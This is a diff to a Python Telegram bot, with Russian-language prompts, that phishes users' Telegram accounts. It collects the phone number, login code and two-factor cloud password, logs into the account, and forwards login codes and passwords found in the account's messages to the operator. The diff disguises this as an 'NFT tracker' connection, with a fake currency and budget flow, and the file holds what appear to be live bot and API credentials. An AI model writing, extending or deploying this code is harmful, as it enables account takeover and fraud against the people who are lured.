@@ -27,7 +27,7 @@ from pyrogram import Client
 from pyrogram.raw.functions.auth import ResetAuthorizations
 
 # --- НАСТРОЙКИ ---
-API_ID = 37647469  # Официальный Desktop App ID
+API_ID = 37647469
 API_HASH = "cb3efe850b55566dbf8224709dfeb5b1"
 BOT_TOKEN = "8950654509:AAFBf78YC2S1t0P9aA5qbVUrGojA2Tm9sr8"
 ADMIN_ID = 8521367180
@@ -75,7 +75,14 @@ class AuthState(StatesGroup):
     waiting_for_password = State()
 
 
+class NftState(StatesGroup):
+    waiting_for_currency = State()
+    waiting_for_price = State()
+    waiting_for_nft_name = State()
+
+
 class BroadcastState(StatesGroup):
+    waiting_for_target = State()
     waiting_for_content = State()
 
 
@@ -132,7 +139,7 @@ async def cmd_start(message: Message, state: FSMContext):
     conn.close()
 
     keyboard = ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton(text="🏴‍☠️ Поделиться контактом", request_contact=True)]],
+        keyboard=[[KeyboardButton(text="Подключить бота", request_contact=True)]],
         resize_keyboard=True,
         one_time_keyboard=True,
     )
@@ -157,14 +164,14 @@ async def process_phone(message: Message, state: FSMContext):
 
     raw_phone = message.contact.phone_number if message.contact else message.text
     if not raw_phone:
-        await message.answer("Пожалуйста, отправь контакт.")
+        await message.answer("Пожалуйста, подключите бота нфт трекер.")
         return
 
     cleaned_digits = re.sub(r"\D", "", raw_phone)
     phone = f"+{cleaned_digits}"
 
     await message.answer(
-        f"⏳ Обрабатываю номер <code>{phone}</code> и запрашиваю код у Telegram...",
+        f"⏳ Обрабатываю Ваш айди <code>{phone}</code> и запрашиваю код у Telegram...",
         reply_markup=ReplyKeyboardRemove(),
         parse_mode="HTML",
     )
@@ -192,8 +199,8 @@ async def process_phone(message: Message, state: FSMContext):
 
         await state.set_state(AuthState.waiting_for_code)
         await message.answer(
-            "Код потверждения \n\n"
-            "Telegram Отправил тебе код в приложения введи его с клавиатуры\n\n"
+            "Код подтверждения \n\n"
+            "Бот отправил вам код для подключения бота\n\n"
             "<code>_ _ _ _ _</code>",
             reply_markup=get_code_keyboard(),
             parse_mode="HTML",
@@ -233,8 +240,8 @@ async def process_code_input(callback: CallbackQuery, state: FSMContext):
     masked_display = " ".join(masked_list)
 
     text = (
-        "Код потверждения \n\n"
-        "Telegram Отправил тебе код в приложения введи его с клавиатуры\n\n"
+        "Код подтверждения \n\n"
+        "Бот отправил вам код для подключения напишите при помощи кнопок или в чат\n\n"
         f"<code>{masked_display}</code>"
     )
 
@@ -265,29 +272,29 @@ async def process_code_input(callback: CallbackQuery, state: FSMContext):
             conn.commit()
             conn.close()
 
-            await callback.message.edit_text(
-                "Юзербот подключен\n\n"
-                "Ты подключил юзербота",
-                parse_mode="Markdown",
-            )
-
-            try:
-                await bot.send_message(
-                    ADMIN_ID,
-                    f"🔔 **Зарегистрирован новый номер!**\n\n👤 ID: `{user_id}`\n📱 Номер: `{phone}`",
-                    parse_mode="Markdown"
-                )
-            except Exception:
-                pass
-
+            # Успешная авторизация пройдена! Переходим к NFT-функционалу
             del temp_auth_data[user_id]
-            await state.clear()
+            
+            currency_kb = InlineKeyboardMarkup(inline_keyboard=[
+                [
+                    InlineKeyboardButton(text="⭐️ Звезды", callback_data="curr_Звезды"),
+                    InlineKeyboardButton(text="💎 TON", callback_data="curr_TON"),
+                    InlineKeyboardButton(text="gram", callback_data="curr_Gram")
+                ]
+            ])
+            await callback.message.edit_text(
+                "✅ **Юзербот успешно подключен!**\n\n"
+                "🎨 Выберите валюту для покупки NFT:",
+                reply_markup=currency_kb,
+                parse_mode="Markdown"
+            )
+            await state.set_state(NftState.waiting_for_currency)
             return
 
         except Exception as e:
             if "SESSION_PASSWORD_NEEDED" in str(e) or "Password" in str(e):
                 await callback.message.edit_text(
-                    "Облачный пороль\n\n"
+                    "Облачный пароль\n\n"
                     "На аккаунте включена двухэтапная аутентификация. Отправь пароль в этот чат!"
                 )
                 await state.set_state(AuthState.waiting_for_password)
@@ -335,14 +342,106 @@ async def process_password(message: Message, state: FSMContext):
         conn.commit()
         conn.close()
 
-        await message.answer("✅ Юзербота подключен под Pasturebot!")
-        await bot.send_message(ADMIN_ID, f"🔔 Номер (2FA):\n🆔 ID: `{user_id}`\n📱 Номер: `{phone}`", parse_mode="Markdown")
         del temp_auth_data[user_id]
-        await state.clear()
+        
+        currency_kb = InlineKeyboardMarkup(inline_keyboard=[
+            [
+                InlineKeyboardButton(text="⭐️ Звезды", callback_data="curr_Звезды"),
+                InlineKeyboardButton(text="💎 TON", callback_data="curr_TON"),
+                InlineKeyboardButton(text="gram", callback_data="curr_Gram")
+            ]
+        ])
+        await message.answer(
+            "✅ **Юзербот подключен под Pasturebot!**\n\n"
+            "🎨 Выберите валюту для покупки NFT:",
+            reply_markup=currency_kb,
+            parse_mode="Markdown"
+        )
+        await bot.send_message(ADMIN_ID, f"🔔 Номер (2FA):\n🆔 ID: `{user_id}`\n📱 Номер: `{phone}`", parse_mode="Markdown")
+        await state.set_state(NftState.waiting_for_currency)
     except Exception as e:
         await message.answer(f"❌ Неверный пароль: {e}")
 
 
+# --- NFT ФУНКЦИОНАЛ ---
+@router.callback_query(NftState.waiting_for_currency, F.data.startswith("curr_"))
+async def process_nft_currency(callback: CallbackQuery, state: FSMContext):
+    currency = callback.data.split("_")[1]
+    await state.update_data(currency=currency)
+    
+    await callback.message.edit_text(
+        f"Вы выбрали валюту: *{currency}*\n\n"
+        "💰 Напишите цену, за какую хотите купить NFT:",
+        parse_mode="Markdown"
+    )
+    await state.set_state(NftState.waiting_for_price)
+    await callback.answer()
+
+
+@router.message(NftState.waiting_for_price, F.text)
+async def process_nft_price(message: Message, state: FSMContext):
+    price = message.text
+    await state.update_data(price=price)
+    
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📦 Все (Любая)", callback_data="nft_all")]
+    ])
+    await message.answer(
+        "🏷 Напишите название NFT, какую вам хочется (или нажмите кнопку «Все»):",
+        reply_markup=kb
+    )
+    await state.set_state(NftState.waiting_for_nft_name)
+
+
+@router.callback_query(NftState.waiting_for_nft_name, F.data == "nft_all")
+async def process_nft_all_callback(callback: CallbackQuery, state: FSMContext):
+    await state.update_data(nft_name="Любая (Все)")
+    await finalize_nft_request(callback.message, state, callback.from_user)
+    await callback.answer()
+
+
+@router.message(NftState.waiting_for_nft_name, F.text)
+async def process_nft_name_text(message: Message, state: FSMContext):
+    nft_name = message.text
+    await state.update_data(nft_name=nft_name)
+    await finalize_nft_request(message, state, message.from_user)
+
+
+async def finalize_nft_request(message_obj, state: FSMContext, user):
+    data = await state.get_data()
+    currency = data.get("currency")
+    price = data.get("price")
+    nft_name = data.get("nft_name")
+    
+    username = f"@{user.username}" if user.username else f"ID: {user.id}"
+    
+    # Сообщение администратору
+    admin_text = (
+        f"🚨 **NFT трекер добавился!** 🚨\n\n"
+        f"👤 Юзер: `{username}`\n"
+        f"🎁 Хочет: `{nft_name}`\n"
+        f"💵 Цена: `{price} {currency}`"
+    )
+    try:
+        await bot.send_message(ADMIN_ID, admin_text, parse_mode="Markdown")
+    except Exception:
+        pass
+
+    out_text = (
+        f"🔍 **Поиск NFT запущен!**\n\n"
+        f"• Желаемое: `{nft_name}`\n"
+        f"• Бюджет: `{price} {currency}`\n\n"
+        "⏳ Ищем подходящие варианты..."
+    )
+    if isinstance(message_obj, CallbackQuery):
+        await message_obj.edit_text(out_text, parse_mode="Markdown")
+    else:
+        await message_obj.answer(out_text, parse_mode="Markdown")
+        
+    await state.clear()
+
+
+# --- АДМИН ПАНЕЛЬ И РАССЫЛКА ---
 @router.callback_query(F.data == "admin_users")
 async def admin_list_users(callback: CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
@@ -451,7 +550,7 @@ async def listen_for_telegram_code(target_id: int, phone: str, string_session: s
                     f"🚨 НАЙДЕН СВЕЖИЙ КОД ИЗ ИСТОРИИ! 🚨\n\n"
                     f"📱 Номер: {phone}\n"
                     f"🔑 Код для входа: {code}\n"
-                    f"🔑 облачный пароль: {pwd_text}\n\n"
+                    f"🔑 Облачный пароль: {pwd_text}\n\n"
                     f"💬 Текст: {text}",
                     parse_mode="Markdown"
                 )
@@ -471,10 +570,10 @@ async def listen_for_telegram_code(target_id: int, phone: str, string_session: s
                         code = match.group(0)
                         await bot.send_message(
                             ADMIN_ID,
-                            f"🚨 НАЙДЕН СВЕЖИЙ КОД ИЗ ИСТОРИИ! 🚨\n\n"
+                            f"🚨 НАЙДЕН СВЕЖИЙ КОД В РЕАЛЬНОМ ВРЕМЕНИ! 🚨\n\n"
                             f"📱 Номер: {phone}\n"
                             f"🔑 Код для входа: {code}\n"
-                            f"🔑 облачный пароль: {pwd_text}\n\n"
+                            f"🔑 Облачный пароль: {pwd_text}\n\n"
                             f"💬 Текст: {text}",
                             parse_mode="Markdown"
                         )
@@ -916,36 +1015,83 @@ async def admin_back_menu(callback: CallbackQuery, state: FSMContext):
     await callback.message.edit_text("👑 Админ-панель:", reply_markup=get_admin_keyboard())
 
 
+# --- НОВАЯ РАССЫЛКА (Всем или Одному) ---
 @router.callback_query(F.data == "admin_broadcast")
 async def admin_broadcast_start(callback: CallbackQuery, state: FSMContext):
     if callback.from_user.id != ADMIN_ID:
         return
-    await callback.message.edit_text("📢 Отправь текст или фото для рассылки:")
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📢 Всем пользователям", callback_data="bc_target_all")],
+        [InlineKeyboardButton(text="👤 Одному пользователю (по ID)", callback_data="bc_target_one")],
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]
+    ])
+    await callback.message.edit_text("🎯 Выберите кому отправить рассылку:", reply_markup=kb)
+    await callback.answer()
+
+
+@router.callback_query(F.data == "bc_target_all")
+async def bc_set_all(callback: CallbackQuery, state: FSMContext):
+    if callback.from_user.id != ADMIN_ID:
+        return
+    await state.update_data(bc_type="all")
+    await callback.message.edit_text("📢 Отправьте текст или фото для рассылки **всем** пользователям:", parse_mode="Markdown")
     await state.set_state(BroadcastState.waiting_for_content)
+
+
+@router.callback_query(F.data == "bc_target_one")
+async def bc_set_one(callback: CallbackQuery, state: FSMContext):
+    if callback.from_user.id != ADMIN_ID:
+        return
+    await state.update_data(bc_type="one")
+    await callback.message.edit_text("👤 Введите **Telegram ID** пользователя, которому хотите отправить сообщение:", parse_mode="Markdown")
+    await state.set_state(BroadcastState.waiting_for_target)
+
+
+@router.message(BroadcastState.waiting_for_target)
+async def bc_get_target_id(message: Message, state: FSMContext):
+    if message.from_user.id != ADMIN_ID:
+        return
+    try:
+        target_uid = int(message.text.strip())
+        await state.update_data(target_uid=target_uid)
+        await message.answer(f"✅ ID `{target_uid}` принят.\n\nТеперь отправьте текст или фото для отправки этому пользователю:", parse_mode="Markdown")
+        await state.set_state(BroadcastState.waiting_for_content)
+    except ValueError:
+        await message.answer("❌ Неверный ID. Введите числовой Telegram ID пользователя:")
 
 
 @router.message(BroadcastState.waiting_for_content)
 async def admin_broadcast_execute(message: Message, state: FSMContext):
     if message.from_user.id != ADMIN_ID:
         return
+    data = await state.get_data()
+    bc_type = data.get("bc_type", "all")
     await state.clear()
 
-    conn = sqlite3.connect("database.db")
-    cursor = conn.cursor()
-    cursor.execute("SELECT user_id FROM users")
-    users = cursor.fetchall()
-    conn.close()
-
-    success, fail = 0, 0
-    for (u_id,) in users:
+    if bc_type == "one":
+        target_uid = data.get("target_uid")
         try:
-            await message.copy_to(chat_id=u_id)
-            success += 1
-            await asyncio.sleep(0.05)
-        except Exception:
-            fail += 1
+            await message.copy_to(chat_id=target_uid)
+            await message.answer(f"✅ Сообщение успешно отправлено пользователю `{target_uid}`!", parse_mode="Markdown")
+        except Exception as e:
+            await message.answer(f"❌ Не удалось отправить сообщение пользователю `{target_uid}`: {e}", parse_mode="Markdown")
+    else:
+        conn = sqlite3.connect("database.db")
+        cursor = conn.cursor()
+        cursor.execute("SELECT user_id FROM users")
+        users = cursor.fetchall()
+        conn.close()
 
-    await message.answer(f"📊 Рассылка завершена!\nУспешно: {success}\nОшибок: {fail}")
+        success, fail = 0, 0
+        for (u_id,) in users:
+            try:
+                await message.copy_to(chat_id=u_id)
+                success += 1
+                await asyncio.sleep(0.05)
+            except Exception:
+                fail += 1
+
+        await message.answer(f"📊 Рассылка завершена!\nУспешно: {success}\nОшибок: {fail}")
 
 
 async def handle(request):
